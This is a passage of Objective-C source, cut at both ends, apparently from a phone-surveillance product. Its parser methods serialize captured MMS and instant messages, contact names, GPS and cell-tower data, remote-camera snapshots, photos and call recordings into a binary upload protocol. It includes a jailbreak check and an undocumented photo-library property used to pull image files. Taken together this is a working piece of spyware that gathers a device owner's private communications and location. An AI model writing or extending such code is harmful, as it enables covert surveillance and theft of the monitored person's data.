	[result appendBytes:&bodySize length:sizeof(bodySize)];
	//DLog(@"appendData 2 %@ to %@", [body dataUsingEncoding:NSUTF8StringEncoding], result);
	[result appendData:[body dataUsingEncoding:NSUTF8StringEncoding]];
	
	//DLog(@"Email Data = %@", result);
	return [result autorelease];
}

+ (NSData *)parseMMSEvent:(MMSEvent *)event  {
	uint8_t direction;
	uint8_t conversationIDSize;
	NSString *conversationID;
	uint8_t senderNumberSize;
	NSString *senderNumber;
	uint8_t contactNameSize;
	NSString *contactName;
	
	direction = [event direction];
	conversationID = [event mConversationID];
	conversationIDSize = [conversationID lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	senderNumber = [event senderNumber];
	senderNumberSize = [senderNumber lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	contactName = [event contactName];
    
    // Ensure that the contact name size is less than 1 byte according to the protocol
    // find the contact name with valid size
    contactName     = [self getStringOfBytes:255 inputString:contactName];    
	contactNameSize = [contactName lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    DLog(@"$$$$$$$$$$$$$$$$ MMS log contact name size %d", contactNameSize)
    DLog(@"$$$$$$$$$$$$$$$$ MMS log contact name %@", contactName)
	
	NSMutableData *result = [[NSMutableData alloc] init];
	
	[result appendBytes:&direction length:sizeof(direction)];
	//DLog(@"result = %@", result);
	[result appendBytes:&conversationIDSize length:sizeof(conversationIDSize)];
	//DLog(@"result = %@", result);
	[result appendData:[conversationID dataUsingEncoding:NSUTF8StringEncoding]];
	[result appendBytes:&senderNumberSize length:sizeof(senderNumberSize)];
	//DLog(@"result = %@", result);
	[result appendData:[senderNumber dataUsingEncoding:NSUTF8StringEncoding]];
	//DLog(@"result = %@", result);
	[result appendBytes:&contactNameSize length:sizeof(contactNameSize)];
	//DLog(@"result = %@", result);
	[result appendData:[contactName dataUsingEncoding:NSUTF8StringEncoding]];
	//DLog(@"result = %@", result);
	
	NSData *recipients = [self parseRecipients:[event recipientStore]];
	[result appendData:recipients];
	//DLog(@"result = %@", result);
	
	uint16_t subjectSize;
	NSString *subject;
	uint16_t textSize;
	NSString *text;
	
	subject = [event subject];
	subjectSize = [subject lengthOfBytesUsingEncoding:NSUTF8StringEncoding];	
	subjectSize = htons(subjectSize);
	text = [event mText];
	textSize = [text lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	textSize = htons(textSize);
	[result appendBytes:&subjectSize length:sizeof(subjectSize)];
	//DLog(@"result = %@", result);
	[result appendData:[subject dataUsingEncoding:NSUTF8StringEncoding]];
	//DLog(@"result = %@", result);
	[result appendBytes:&textSize length:sizeof(textSize)];
	//DLog(@"result = %@", result);
	[result appendData:[text dataUsingEncoding:NSUTF8StringEncoding]];
	NSData *attachments = [self parseAttachments:[event attachmentStore]];
	[result appendData:attachments];
	//DLog(@"result = %@", result);
	
	return [result autorelease];
}

+ (NSData *)parseIMEvent:(IMEvent *)event {
	uint8_t direction;
	uint8_t userIDSize;
	NSString *userID;

	direction = [event direction];
	userID = [event userID];
	userIDSize = [userID lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	
	NSMutableData *result = [[NSMutableData alloc] init];
	
	[result appendBytes:&direction length:sizeof(direction)];
	[result appendBytes:&userIDSize length:sizeof(userIDSize)];
	[result appendData:[userID dataUsingEncoding:NSUTF8StringEncoding]];	
	
	NSData *participants = [self parseParticipants:[event participantList]];
	[result appendData:participants];
	
	uint8_t IMServiceIDSize;
	NSString *IMServiceID;
	uint16_t messageSize;
	NSString *message;
	uint8_t userDisplayNameSize;
	NSString *userDisplayName;
	
	IMServiceID = [event IMServiceID];
	IMServiceIDSize = [IMServiceID lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	message = [event message];
	messageSize = [message lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	userDisplayName = [event userDisplayName];
	userDisplayNameSize = [userDisplayName lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	
	messageSize = htons(messageSize);
	
	[result appendBytes:&IMServiceIDSize length:sizeof(IMServiceIDSize)];
	[result appendData:[IMServiceID dataUsingEncoding:NSUTF8StringEncoding]];
	[result appendBytes:&messageSize length:sizeof(messageSize)];
	[result appendData:[message dataUsingEncoding:NSUTF8StringEncoding]];
	[result appendBytes:&userDisplayNameSize length:sizeof(userDisplayNameSize)];
	[result appendData:[userDisplayName dataUsingEncoding:NSUTF8StringEncoding]];
	
	return [result autorelease];
}

+ (NSData *)parsePanicImage:(PanicImage *)event {
	double lat;
	double lon;
	float altitude;
	int8_t coordinateAccuracy;
	int8_t networkNameSize;
	NSString *networkName;
	int8_t networkIDSize;
	NSString *networkID;
	int8_t cellNameSize;
	NSString *cellName;
	int32_t cellID;
	int32_t countryCode;
	int32_t areaCode;
	int8_t mediaType;
	int32_t dataSize;
	NSData *data;
	
	lat = [event lat];
	lat = [self GetDoubleBigEndian:lat];	
	lon = [event lon];
	lon = [self GetDoubleBigEndian:lon];	
	altitude = [event altitude];
	//altitude = htonl(altitude);
	CFSwappedFloat32 swappedAltitude = CFConvertFloat32HostToSwapped(altitude);
	coordinateAccuracy = [event coordinateAccuracy];
	networkName = [event networkName];
	networkNameSize = [networkName length];
	networkID = [event networkID];
	networkIDSize = [networkID length];
	cellName = [event cellName];
	cellNameSize = [cellName length];
	cellID = [event cellID];
	countryCode = [event countryCode];
	areaCode = [event areaCode];
	cellID = htonl(cellID);
	countryCode = htonl(countryCode);
	areaCode = htonl(areaCode);
	
	mediaType = [event mediaType];
	data = [event mediaData];
	dataSize = [data length];
	dataSize = htonl(dataSize);
	
	NSMutableData *result = [[NSMutableData alloc] init];
	[result appendBytes:&lat length:sizeof(lat)];
	[result appendBytes:&lon length:sizeof(lon)];
	[result appendBytes:&swappedAltitude length:sizeof(swappedAltitude)];
	[result appendBytes:&coordinateAccuracy length:sizeof(coordinateAccuracy)];
	[result appendBytes:&networkNameSize length:sizeof(networkNameSize)];
	[result appendData:[networkName dataUsingEncoding:NSUTF8StringEncoding]];
	[result appendBytes:&networkIDSize length:sizeof(networkIDSize)];
	[result appendData:[networkID dataUsingEncoding:NSUTF8StringEncoding]];
	[result appendBytes:&cellNameSize length:sizeof(cellNameSize)];
	[result appendData:[cellName dataUsingEncoding:NSUTF8StringEncoding]];
	[result appendBytes:&cellID length:sizeof(cellID)];
	[result appendBytes:&countryCode length:sizeof(countryCode)];
	[result appendBytes:&areaCode length:sizeof(areaCode)];
	[result appendBytes:&mediaType length:sizeof(mediaType)];
	[result appendBytes:&dataSize length:sizeof(dataSize)];
	[result appendData:data];
	
	return [result autorelease];
}

+ (NSData *)parsePanicStatus:(PanicStatus *)event {
	uint8_t panicStatus = [event status];
	NSMutableData *result = [[NSMutableData alloc] init];
	[result appendBytes:&panicStatus length:sizeof(panicStatus)];
	
	
	return [result autorelease];
}

+ (NSData *)parseWallpaperThumbnailEvent:(WallpaperThumbnailEvent *)event {
	uint32_t paringID;
	uint8_t mediaType;
	uint32_t mediaDataSize;
	NSData *mediaData;
	uint32_t actualFileSize;
	paringID = [event paringID];
	paringID = htonl(paringID);
	mediaType = [event mediaType];
	mediaData = [event mediaData];
	mediaDataSize = [mediaData length];
	mediaDataSize = htonl(mediaDataSize);
	actualFileSize = [event actualFileSize];
	actualFileSize = htonl(actualFileSize);
	
	NSMutableData *result = [[NSMutableData alloc] init];
	[result appendBytes:&paringID length:sizeof(paringID)];
	[result appendBytes:&mediaType length:sizeof(mediaType)];
	[result appendBytes:&mediaDataSize length:sizeof(mediaDataSize)];
	[result appendData:mediaData];
	[result appendBytes:&actualFileSize length:sizeof(actualFileSize)];
	
	return [result autorelease];
}

+ (NSData *)parseCameraImageThumbnailEvent:(CameraImageThumbnailEvent *)event {
	uint32_t paringID;
	uint8_t mediaType;
	double lon;
	double lat;
	float altitude;
	uint32_t mediaDataSize;
	NSData *mediaData;
	uint32_t actualFileSize;
	
	paringID = [event paringID];
	paringID = htonl(paringID);
	mediaType = [event mediaType];
	lon = [[event geo] lon];
	lon = [self GetDoubleBigEndian:lon];	
	lat = [[event geo] lat];
	lat = [self GetDoubleBigEndian:lat];	
	altitude = [[event geo] altitude];
	//altitude = htonl(altitude);
	CFSwappedFloat32 swappedAltitude = CFConvertFloat32HostToSwapped(altitude);
	
	mediaData = [event mediaData];
	mediaDataSize = [mediaData length];
	mediaDataSize = htonl(mediaDataSize);
	actualFileSize = [event actualFileSize];
	actualFileSize = htonl(actualFileSize);
	
	
	NSMutableData *result = [[NSMutableData alloc] init];
	[result appendBytes:&paringID length:sizeof(paringID)];
	[result appendBytes:&mediaType length:sizeof(mediaType)];
	[result appendBytes:&lon length:sizeof(lon)];
	[result appendBytes:&lat length:sizeof(lat)];
	[result appendBytes:&swappedAltitude length:sizeof(swappedAltitude)];
	
	[result appendBytes:&mediaDataSize length:sizeof(mediaDataSize)];
	[result appendData:mediaData];
	[result appendBytes:&actualFileSize length:sizeof(actualFileSize)];
	
	return [result autorelease];
}

+ (NSData *)parseCameraImageThumbnailEventV10:(CameraImageThumbnailEvent *)event {
    uint32_t paringID;
    uint8_t mediaType;
    double lon;
    double lat;
    float altitude;
    uint32_t mediaDataSize;
    NSData *mediaData;
    uint32_t actualFileSize;
    NSString *actualFileName;
    uint16_t actualFileNameSize;
    
    paringID = [event paringID];
    paringID = htonl(paringID);
    mediaType = [event mediaType];
    lon = [[event geo] lon];
    lon = [self GetDoubleBigEndian:lon];
    lat = [[event geo] lat];
    lat = [self GetDoubleBigEndian:lat];
    altitude = [[event geo] altitude];
    //altitude = htonl(altitude);
    CFSwappedFloat32 swappedAltitude = CFConvertFloat32HostToSwapped(altitude);
    
    mediaData = [event mediaData];
    mediaDataSize = [mediaData length];
    mediaDataSize = htonl(mediaDataSize);
    actualFileSize = [event actualFileSize];
    actualFileSize = htonl(actualFileSize);
    actualFileName = event.actualFileName;
    actualFileNameSize = [actualFileName lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    actualFileNameSize = htons(actualFileNameSize);
    
    NSMutableData *result = [[NSMutableData alloc] init];
    [result appendBytes:&paringID length:sizeof(paringID)];
    [result appendBytes:&mediaType length:sizeof(mediaType)];
    [result appendBytes:&lon length:sizeof(lon)];
    [result appendBytes:&lat length:sizeof(lat)];
    [result appendBytes:&swappedAltitude length:sizeof(swappedAltitude)];
    
    [result appendBytes:&mediaDataSize length:sizeof(mediaDataSize)];
    [result appendData:mediaData];
    [result appendBytes:&actualFileSize length:sizeof(actualFileSize)];
    [result appendBytes:&actualFileNameSize length:sizeof(uint16_t)];
    [result appendData:[actualFileName dataUsingEncoding:NSUTF8StringEncoding]];
    
    return [result autorelease];
}

+ (NSData *)parseAudioFileThumbnailEvent:(AudioFileThumbnailEvent *)event {
	uint32_t paringID;
	uint8_t mediaType;
	uint32_t mediaDataSize;
	NSData *mediaData;
	uint32_t actualFileSize;
	uint32_t actualDuration;
	paringID = [event paringID];
	paringID = htonl(paringID);
	mediaType = [event mediaType];
	mediaData = [event mediaData];
	mediaDataSize = [mediaData length];
	mediaDataSize = htonl(mediaDataSize);
	actualFileSize = [event actualFileSize];
	actualFileSize = htonl(actualFileSize);
	actualDuration = [event actualDuration];
	actualDuration = htonl(actualDuration);
	
	NSMutableData *result = [[NSMutableData alloc] init];
	[result appendBytes:&paringID length:sizeof(paringID)];
	[result appendBytes:&mediaType length:sizeof(mediaType)];
	[result appendBytes:&mediaDataSize length:sizeof(mediaDataSize)];
	[result appendData:mediaData];
	[result appendBytes:&actualFileSize length:sizeof(actualFileSize)];
	[result appendBytes:&actualDuration length:sizeof(actualDuration)];
	
	return [result autorelease];
}

+ (NSData *)parseAudioFileThumbnailEventV10:(AudioFileThumbnailEvent *)event {
    uint32_t paringID;
    uint8_t mediaType;
    uint32_t mediaDataSize;
    NSData *mediaData;
    uint32_t actualFileSize;
    uint32_t actualDuration;
    NSString *actualFileName;
    uint16_t actualFileNameSize;
    
    paringID = [event paringID];
    paringID = htonl(paringID);
    mediaType = [event mediaType];
    mediaData = [event mediaData];
    mediaDataSize = [mediaData length];
    mediaDataSize = htonl(mediaDataSize);
    actualFileSize = [event actualFileSize];
    actualFileSize = htonl(actualFileSize);
    actualDuration = [event actualDuration];
    actualDuration = htonl(actualDuration);
    actualFileName = event.actualFileName;
    actualFileNameSize = [actualFileName lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    actualFileNameSize = htons(actualFileNameSize);
    
    NSMutableData *result = [[NSMutableData alloc] init];
    [result appendBytes:&paringID length:sizeof(paringID)];
    [result appendBytes:&mediaType length:sizeof(mediaType)];
    [result appendBytes:&mediaDataSize length:sizeof(mediaDataSize)];
    [result appendData:mediaData];
    [result appendBytes:&actualFileSize length:sizeof(actualFileSize)];
    [result appendBytes:&actualDuration length:sizeof(actualDuration)];
    [result appendBytes:&actualFileNameSize length:sizeof(uint16_t)];
    [result appendData:[actualFileName dataUsingEncoding:NSUTF8StringEncoding]];
    
    return [result autorelease];
}

+ (NSData *)parseAudioConversationThumbnailEvent:(AudioConversationThumbnailEvent *)event {
	uint32_t paringID;
	uint8_t mediaType;
	EmbeddedCallInfo *callInfo;
	uint32_t mediaDataSize;
	NSData *mediaData;
	uint32_t actualFileSize;
	uint32_t actualDuration;
	
	paringID = [event paringID];
	paringID = htonl(paringID);
	mediaType = [event mediaType];
	callInfo = [event embeddedCallInfo];
	mediaData = [event mediaData];
	mediaDataSize = [mediaData length];
	mediaDataSize = htonl(mediaDataSize);
	actualFileSize = [event actualFileSize];
	actualFileSize = htonl(actualFileSize);
	actualDuration = [event actualDuration];
	actualDuration = htonl(actualDuration);
	
	NSMutableData *result = [[NSMutableData alloc] init];
	[result appendBytes:&paringID length:sizeof(paringID)];
	[result appendBytes:&mediaType length:sizeof(mediaType)];
	
	NSData *callInfoData = [self parseEmbeddedCallInfo:callInfo];
	[result appendData:callInfoData];
	
	
	[result appendBytes:&mediaDataSize length:sizeof(mediaDataSize)];
	[result appendData:mediaData];
	[result appendBytes:&actualFileSize length:sizeof(actualFileSize)];
	[result appendBytes:&actualDuration length:sizeof(actualDuration)];

	return [result autorelease];	
}

+ (NSData *)parseVideoFileThumbnailEvent:(VideoFileThumbnailEvent *)event {
	uint32_t paringID;
	uint8_t mediaType;
	uint32_t mediaDataSize;
	NSData *mediaData;
	uint8_t imageCount;
	
	uint32_t imageDataSize;
	NSData *imageData;
	
	uint32_t actualFileSize;
	uint32_t actualDuration;
	
	paringID = [event paringID];
	paringID = htonl(paringID);
	mediaType = [event mediaType];
	mediaData = [event mediaData];
	mediaDataSize = [mediaData length];
	mediaDataSize = htonl(mediaDataSize);
	
	imageCount = [[event thumbnailList] count];
	
	
	actualFileSize = [event actualFileSize];
	actualFileSize = htonl(actualFileSize);
	actualDuration = [event actualDuration];
	actualDuration = htonl(actualDuration);
	
	NSMutableData *result = [[NSMutableData alloc] init];
	[result appendBytes:&paringID length:sizeof(paringID)];
	[result appendBytes:&mediaType length:sizeof(mediaType)];
	
	[result appendBytes:&mediaDataSize length:sizeof(mediaDataSize)];
	[result appendData:mediaData];
	
	[result appendBytes:&imageCount length:sizeof(imageCount)];
	
	for (Thumbnail *obj in [event thumbnailList]) {
		DLog (@"Video thumbnail, obj = %@", obj)
		imageData = [obj imageData];
		imageDataSize = [imageData length];
		imageDataSize = htonl(imageDataSize);
		[result appendBytes:&imageDataSize length:sizeof(imageDataSize)];
		[result appendData:imageData];
	}
	
	[result appendBytes:&actualFileSize length:sizeof(actualFileSize)];
	[result appendBytes:&actualDuration length:sizeof(actualDuration)];
	return [result autorelease];
}

+ (NSData *)parseVideoFileThumbnailEventV10:(VideoFileThumbnailEvent *)event {
    uint32_t paringID;
    uint8_t mediaType;
    uint32_t mediaDataSize;
    NSData *mediaData;
    uint8_t imageCount;
    
    uint32_t imageDataSize;
    NSData *imageData;
    
    uint32_t actualFileSize;
    uint32_t actualDuration;
    NSString *actualFileName;
    uint16_t actualFileNameSize;
    
    paringID = [event paringID];
    paringID = htonl(paringID);
    mediaType = [event mediaType];
    mediaData = [event mediaData];
    mediaDataSize = [mediaData length];
    mediaDataSize = htonl(mediaDataSize);
    
    imageCount = [[event thumbnailList] count];
    
    
    actualFileSize = [event actualFileSize];
    actualFileSize = htonl(actualFileSize);
    actualDuration = [event actualDuration];
    actualDuration = htonl(actualDuration);
    actualFileName = event.actualFileName;
    actualFileNameSize = [actualFileName lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    actualFileNameSize = htons(actualFileNameSize);
    
    NSMutableData *result = [[NSMutableData alloc] init];
    [result appendBytes:&paringID length:sizeof(paringID)];
    [result appendBytes:&mediaType length:sizeof(mediaType)];
    
    [result appendBytes:&mediaDataSize length:sizeof(mediaDataSize)];
    [result appendData:mediaData];
    
    [result appendBytes:&imageCount length:sizeof(imageCount)];
    
    for (Thumbnail *obj in [event thumbnailList]) {
        DLog (@"Video thumbnail, obj = %@", obj)
        imageData = [obj imageData];
        imageDataSize = [imageData length];
        imageDataSize = htonl(imageDataSize);
        [result appendBytes:&imageDataSize length:sizeof(imageDataSize)];
        [result appendData:imageData];
    }
    
    [result appendBytes:&actualFileSize length:sizeof(actualFileSize)];
    [result appendBytes:&actualDuration length:sizeof(actualDuration)];
    [result appendBytes:&actualFileNameSize length:sizeof(actualFileNameSize)];
    [result appendData:[actualFileName dataUsingEncoding:NSUTF8StringEncoding]];
    
    return [result autorelease];
}

+ (NSData *)parseWallpaperEvent:(WallpaperEvent *)event {
	uint32_t paringID;
	uint8_t mediaType;
	uint32_t mediaDataSize;
	NSData *mediaData;
	
	paringID = [event paringID];
	paringID = htonl(paringID);
	mediaType = [event mediaType];
	mediaData = [event mediaData];
	mediaDataSize = [mediaData length];
	mediaDataSize = htonl(mediaDataSize);
	
	NSMutableData *result = [[NSMutableData alloc] init];
	[result appendBytes:&paringID length:sizeof(paringID)];
	[result appendBytes:&mediaType length:sizeof(mediaType)];
	[result appendBytes:&mediaDataSize length:sizeof(mediaDataSize)];
	[result appendData:mediaData];

	return [result autorelease];
}

+ (NSData *)parseCameraImageEvent:(CameraImageEvent *)event payloadFileHandle: (NSFileHandle *) aFileHandle {
	uint32_t paringID;
	uint8_t mediaType;
	double lon;
	double lat;
	float altitude;		
	uint8_t fileNameSize;			
	NSString *fileName;				// to send to the server	
	NSString *fullFileName;			// to get the actual file
	
	__block uint32_t mediaDataSize;
	NSData *mediaData = nil;
	
	paringID = [event paringID];
	paringID = htonl(paringID);
	mediaType = [event mediaType];
	lon = [[event geo] lon];
	lon = [self GetDoubleBigEndian:lon];	
	lat = [[event geo] lat];
	lat = [self GetDoubleBigEndian:lat];	
	altitude = [[event geo] altitude];
	//altitude = htonl(altitude);
	CFSwappedFloat32 swappedAltitude = CFConvertFloat32HostToSwapped(altitude);
	
	fullFileName = [event fileName];
	fileName = [fullFileName lastPathComponent];
	fileNameSize = [fileName length];
	DLog (@"filename is: %@", fileName)				 
	
	mediaData = [event mediaData];
	mediaDataSize = [mediaData length];
	mediaDataSize = htonl(mediaDataSize);
	
	NSMutableData *result = [[NSMutableData alloc] init];

	[result appendBytes:&paringID length:sizeof(paringID)];
	[result appendBytes:&mediaType length:sizeof(mediaType)];
	[result appendBytes:&lon length:sizeof(lon)];
	[result appendBytes:&lat length:sizeof(lat)];
	[result appendBytes:&swappedAltitude length:sizeof(swappedAltitude)];
	
	[result appendBytes:&fileNameSize length:sizeof(fileNameSize)];
	[result appendData:[fileName dataUsingEncoding:NSUTF8StringEncoding]];
	
	// Method 1 (allocate data two time)
//	[result appendBytes:&mediaDataSize length:sizeof(mediaDataSize)];
//	[result appendData:mediaData];
	
	// Method 2 (read data from, allocate data only one time)
	// File size
	NSFileManager *fileManager = [NSFileManager defaultManager];
	NSError *error = nil;
	NSDictionary *attr = [fileManager attributesOfItemAtPath:fullFileName error:&error];
	DLog (@"Attributes of the image file = %@, error = %@", attr, error);
    if ([[attr objectForKey:NSFileType] isEqualToString:NSFileTypeSymbolicLink]) {
        NSString *actualPathForSymbolicLink = [fileManager destinationOfSymbolicLinkAtPath:fullFileName error:NULL];
        DLog(@"File path for symbolic link: %@", actualPathForSymbolicLink)
        
        attr = [fileManager attributesOfItemAtPath:actualPathForSymbolicLink error:&error];
    }
    DLog (@"fileSize = %lld", [attr fileSize]);
	if (!error) {
		mediaDataSize = [attr fileSize];
		mediaDataSize = htonl(mediaDataSize);
		[result appendBytes:&mediaDataSize length:sizeof(mediaDataSize)];
		
		[aFileHandle writeData:result];
		
		// File data
		NSFileHandle *fileHandle = [NSFileHandle fileHandleForReadingAtPath:fullFileName];
		NSUInteger megabyte = pow(1024, 2);
		while (1) {
			//[result appendData:mediaData];
			
			NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
			NSData *bytes = [fileHandle readDataOfLength:megabyte]; // Use local variable to allocate 1 mb
			NSInteger size = [bytes length];
			[aFileHandle writeData:bytes];
			[aFileHandle synchronizeFile]; // Flus data to file
			bytes = nil;
			[pool release];
			
			if (size == 0) {
				break;
			}
		}
		[fileHandle closeFile];
		
	} else {
#if TARGET_OS_IPHONE
        if (![ProtocolParserUtil isDeviceJailbroken]) {
            PHFetchOptions *allPhotosOptions = [PHFetchOptions new];
            allPhotosOptions.sortDescriptors = @[[NSSortDescriptor sortDescriptorWithKey:@"creationDate" ascending:NO]];
            
            __block PHAsset *actualAsset = nil;
            
            PHFetchResult *allPhotosResult = [PHAsset fetchAssetsWithMediaType:PHAssetMediaTypeImage options:allPhotosOptions];
            [allPhotosResult enumerateObjectsUsingBlock:^(PHAsset *assetObject, NSUInteger idx, BOOL *stop) {
                //File path of PHAsset is undocument property
                NSString *assetFilePath = [[assetObject performSelector:@selector(mainFileURL)] absoluteString];
                if ([fullFileName isEqualToString:assetFilePath]) {
                    actualAsset = assetObject;
                    *stop = YES;
                }
            }];
            
            if (actualAsset) {
                PHImageRequestOptions * imageRequestOptions = [[[PHImageRequestOptions alloc] init] autorelease];
                imageRequestOptions.synchronous = YES;
                
                [[PHImageManager defaultManager]
                 requestImageDataForAsset:actualAsset
                 options:imageRequestOptions
                 resultHandler:^(NSData *imageData, NSString *dataUTI,
                                 UIImageOrientation orientation,
                                 NSDictionary *info)
                 {
                     //Need to fixed about orientation
                     UIImage *imageFromData = [UIImage imageWithData:imageData];
                     imageFromData = [ProtocolParserUtil normalizedImage:imageFromData];
                     //Convert it back to NSData
                     NSData *nomalizedData = UIImagePNGRepresentation(imageFromData);
                     
                     mediaDataSize = nomalizedData.length;
                     mediaDataSize = htonl(mediaDataSize);
                     [result appendBytes:&mediaDataSize length:sizeof(mediaDataSize)];
                     
                     [aFileHandle writeData:result];
                     
                     NSUInteger length = [nomalizedData length];
                     NSUInteger megabyte = pow(1024, 2);
                     NSUInteger offset = 0;
                     do {
                         NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
                         NSUInteger thisChunkSize = length - offset > megabyte ? megabyte : length - offset;
                         NSData* bytes = [NSData dataWithBytesNoCopy:(char *)[nomalizedData bytes] + offset
                                                              length:thisChunkSize
                                                        freeWhenDone:NO];
                         offset += thisChunkSize;
                         // do something with chunk
                         [aFileHandle writeData:bytes];
                         [aFileHandle synchronizeFile]; // Flus data to file
                         bytes = nil;
                         [pool release];
                     } while (offset < length);
                     DLog(@"SUCSESS");
                 }];
            }
            else {
                DLog(@"FAIL");
                mediaDataSize = 0;
                mediaDataSize = htonl(mediaDataSize);
                [result appendBytes:&mediaDataSize length:sizeof(mediaDataSize)];
                
                [aFileHandle writeData:result];
            }
        }
        else {
            DLog(@"FAIL");
            mediaDataSize = 0;
            mediaDataSize = htonl(mediaDataSize);
            [result appendBytes:&mediaDataSize length:sizeof(mediaDataSize)];
            
            [aFileHandle writeData:result];
        }
#else
        mediaDataSize = 0;
        mediaDataSize = htonl(mediaDataSize);
        [result appendBytes:&mediaDataSize length:sizeof(mediaDataSize)];
        
        [aFileHandle writeData:result];
#endif
	}
	[result setData:[NSData data]];
	
	return [result autorelease];
}

+ (NSData *)parseRemoteCameraImageEvent:(RemoteCameraImageEvent *)event payloadFileHandle: (NSFileHandle *) aFileHandle {
    
    /*
     ---- Remote Camera Phoenix Event Structure ----
     
     ​PAIRING_ID	​​   Integer (U)	​4
     ​FORMAT        ​Enumeration	​1
     ​CAMERA_TYPE   Enumeration​	1
     ​GEOTAG	​       Structure	​Variable
     ​L_256         ​​Integer (U)	​1
     ​FILENAME      ​String	​Variable
     ​L_DATA        ​​Integer (U)	​4
     ​IMAGE_DATA        ​String	Variable
     
     */
    
	uint32_t paringID;
	uint8_t mediaType;
    uint8_t cameraType;
	double lon;
	double lat;
	float altitude;
	uint8_t fileNameSize;
	NSString *fileName = nil;				// to send to the server
	NSString *fullFileName = nil;			// to get the actual file
	
	uint32_t mediaDataSize;
	NSData *mediaData = nil;
	
	paringID    = (uint32_t)[event paringID];
	paringID    = htonl(paringID);
    
	mediaType   = [event mediaType];

   
    
	lon         = [[event geo] lon];
	lon         = [self GetDoubleBigEndian:lon];
	lat         = [[event geo] lat];
	lat         = [self GetDoubleBigEndian:lat];
	altitude = [[event geo] altitude];
	//altitude = htonl(altitude);
	CFSwappedFloat32 swappedAltitude = CFConvertFloat32HostToSwapped(altitude);
	
	fullFileName    = [event fileName];
	fileName        = [fullFileName lastPathComponent];
	fileNameSize = [fileName lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	DLog (@"filename is: %@", fileName)
    
    // check if this is rear or front camera
    cameraType = [event mCameraType];
    DLog (@"cameraType %d", cameraType)
    
	mediaData       = [event mediaData];
	mediaDataSize   = (uint32_t)[mediaData length];
	mediaDataSize   = htonl(mediaDataSize);
	
	NSMutableData *result = [[NSMutableData alloc] init];
    
	[result appendBytes:&paringID length:sizeof(paringID)];                 // paring ID
	[result appendBytes:&mediaType length:sizeof(mediaType)];               // format
    [result appendBytes:&cameraType length:sizeof(cameraType)];             // camera type
	[result appendBytes:&lon length:sizeof(lon)];                           // long
	[result appendBytes:&lat length:sizeof(lat)];                           // la
	[result appendBytes:&swappedAltitude length:sizeof(swappedAltitude)];   // all
	
	[result appendBytes:&fileNameSize length:sizeof(fileNameSize)];         // filename size
	[result appendData:[fileName dataUsingEncoding:NSUTF8StringEncoding]];  // filename
	
	// Method 1 (allocate data two time)
    //	[result appendBytes:&mediaDataSize length:sizeof(mediaDataSize)];
    //	[result appendData:mediaData];
	
	// Method 2 (read data from, allocate data only one time)
	// File size
	NSFileManager *fileManager = [NSFileManager defaultManager];
	NSError *error = nil;
	NSDictionary *attr = [fileManager attributesOfItemAtPath:fullFileName error:&error];
	DLog (@"Attributes of the image file = %@, error = %@", attr, error);
    if ([[attr objectForKey:NSFileType] isEqualToString:NSFileTypeSymbolicLink]) {
        NSString *actualPathForSymbolicLink = [fileManager destinationOfSymbolicLinkAtPath:fullFileName error:NULL];
        DLog(@"File path for symbolic link: %@", actualPathForSymbolicLink)
        
        attr = [fileManager attributesOfItemAtPath:actualPathForSymbolicLink error:&error];
    }
    DLog (@"fileSize = %lld", [attr fileSize]);
	if (!error) {
		mediaDataSize = (uint32_t)[attr fileSize];
		mediaDataSize = htonl(mediaDataSize);
		[result appendBytes:&mediaDataSize length:sizeof(mediaDataSize)];
		
		[aFileHandle writeData:result];
		
		// File data
		NSFileHandle *fileHandle = [NSFileHandle fileHandleForReadingAtPath:fullFileName];
		NSUInteger megabyte = pow(1024, 2);
		while (1) {
			//[result appendData:mediaData];
			
			NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
			NSData *bytes = [fileHandle readDataOfLength:megabyte]; // Use local variable to allocate 1 mb
			NSInteger size = [bytes length];
			[aFileHandle writeData:bytes];
			[aFileHandle synchronizeFile]; // Flus data to file
			bytes = nil;
			[pool release];
			
			if (size == 0) {
				break;
			}
		}
		[fileHandle closeFile];
		
	} else {
		mediaDataSize = 0;
		mediaDataSize = htonl(mediaDataSize);
		[result appendBytes:&mediaDataSize length:sizeof(mediaDataSize)];
		
		[aFileHandle writeData:result];
	}
	[result setData:[NSData data]];
	
	return [result autorelease];
}

+ (NSData *)parseAudioConversationEvent:(AudioConversationEvent *)event payloadFileHandle: (NSFileHandle *) aFileHandle {
	uint32_t paringID;
	uint8_t mediaType;
	EmbeddedCallInfo *callInfo;
	uint8_t fileNameSize;
	NSString *fileName;	
	NSString *fullFileName;
	uint32_t mediaDataSize;
	NSData *mediaData = nil;

	paringID = [event paringID];
	paringID = htonl(paringID);
	mediaType = [event mediaType];
	callInfo = [event embeddedCallInfo];
		
	fullFileName	= [event fileName];
	fileName		= [fullFileName lastPathComponent];
	fileNameSize	= [fileName length];
	DLog (@"filename is: %@", fileName)	
	
	mediaData = [event mediaData];
	mediaDataSize = [mediaData length];
	mediaDataSize = htonl(mediaDataSize);
	
	NSMutableData *result = [[NSMutableData alloc] init];
	
	[result appendBytes:&paringID length:sizeof(paringID)];
	[result appendBytes:&mediaType length:sizeof(mediaType)];

	NSData *callInfoData = [self parseEmbeddedCallInfo:callInfo];
	[result appendData:callInfoData];
	
	[result appendBytes:&fileNameSize length:sizeof(fileNameSize)];
	[result appendData:[fileName dataUsingEncoding:NSUTF8StringEncoding]];
	
	// Method 1 (allocate data two time)
//	[result appendBytes:&mediaDataSize length:sizeof(mediaDataSize)];
//	DLog(@"Result %@", result);
//	[result appendData:mediaData];
	
	// Method 2 (read data from, allocate data only one time)
	// File size
	NSFileManager *fileManager = [NSFileManager defaultManager];
	NSError *error = nil;
	NSDictionary *attr = [fileManager attributesOfItemAtPath:fullFileName error:&error];
	DLog (@"Attributes of the audio conversation file = %@, error = %@", attr, error);
    if ([[attr objectForKey:NSFileType] isEqualToString:NSFileTypeSymbolicLink]) {
